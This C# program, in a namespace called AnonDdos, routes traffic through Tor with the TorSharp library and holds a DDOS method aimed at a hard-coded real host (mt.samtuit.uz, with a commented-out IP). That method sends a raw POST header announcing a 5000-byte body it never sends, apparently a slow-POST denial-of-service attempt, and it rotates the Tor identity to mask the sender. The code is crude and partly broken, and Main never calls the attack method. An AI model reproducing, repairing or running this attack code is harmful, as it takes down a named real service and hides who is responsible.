using Knapcode.TorSharp;
using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Xml;

namespace AnonDdos
{
    class Program
    {
        [Obsolete]
        static async Task Main(string[] args)
        {
            /*try
            {*/
                var cli = new HttpClient();
                
                //Console.ReadKey(true);
                var settings = new TorSharpSettings
                {
                    ZippedToolsDirectory = Path.Combine(Path.GetTempPath(), "TorZipped"),
                    ExtractedToolsDirectory = Path.Combine(Path.GetTempPath(), "TorExtracted"),
                    PrivoxyPort = 1337,
                    TorSocksPort = 1338,
                    TorControlPort = 1339,
                    TorControlPassword = "foobar"
                };

                // download tools
                await new TorSharpToolFetcher(settings, new HttpClient()).FetchAsync();

                // execute
                var proxy = new TorSharpProxy(settings);
                var handler = new HttpClientHandler
                {
                    Proxy = new WebProxy(new Uri("http://localhost:" + settings.PrivoxyPort))
                };

                var httpClient = new HttpClient(handler);
                await proxy.ConfigureAndStartAsync();
                Console.WriteLine(var());
                Console.WriteLine(httpClient.GetStringAsync("http://ipinfo.io/ip").Result);
                await proxy.GetNewIdentityAsync();
                Console.WriteLine(httpClient.GetStringAsync("http://ipinfo.io/ip").Result);
                proxy.Stop();
            /*}
            catch (Exception ex)
            {

                Console.WriteLine("Shunchaki ppc error code:\n" + ex.Message);
            }*/
            
        }
        static string var()
        {
            var request = (HttpWebRequest)WebRequest.Create("http://ipinfo.io/ip");
            request.Proxy = new WebProxy(new Uri("http://localhost:1337"));
            HttpWebResponse response = null;
            string responseString = null;
            try
            {
                response = (HttpWebResponse)request.GetResponse();
                responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                return responseString;
            }
            catch (Exception ex)
            {
                return ex.Message;

            }
        }
        static string target = "http://mt.samtuit.uz";

        [Obsolete]
        private static async Task DDOS(TorSharpProxy proxy)
        {
           
            var handler = new HttpClientHandler
            {
                Proxy = new WebProxy(new Uri("http://localhost:1337"))
            };
            //UdpClient udp = new UdpClient(handler);
            //udp.Connect(IPAddress.Parse("195.158.11.109"), 80);
            var httpClient = new HttpClient(handler);
            await proxy.ConfigureAndStartAsync();
            Console.WriteLine(await httpClient.GetStringAsync("http://api.ipify.org"));
            StreamWriter stream =  new StreamWriter(await httpClient.GetStreamAsync("http://mt.samtuit.uz"));

            stream.Write($"POST / HTTP/1.1\r\nHost: {target}\r\nContent-length: 5000\r\n\r\n");
            stream.Flush();

            await proxy.GetNewIdentityAsync();
            Console.WriteLine(await httpClient.GetStringAsync("http://api.ipify.org"));
            proxy.Stop();
        }
    }
}
